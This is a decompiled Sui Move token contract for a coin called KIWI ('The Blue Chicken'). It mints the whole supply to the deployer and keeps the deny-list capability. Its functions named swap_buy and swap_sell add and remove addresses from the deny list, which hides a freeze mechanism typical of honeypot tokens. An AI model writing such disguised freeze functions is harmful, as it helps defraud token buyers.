module 0x3deb41c1215301624a56b4cedb52c3cf119e742757bbfe6053e63a2675ea4cac::kiwi {
    struct KIWI has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: KIWI, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<KIWI>(arg0, 9, b"Kiwi", b"The Blue Chicken", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmfEjzQDZqYebfQcoMP28LRWNos3uPVbAR3mE716HsQxtd"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<KIWI>(&mut v3, 100000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<KIWI>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<KIWI>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<KIWI>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<KIWI>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<KIWI>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<KIWI>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<KIWI>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

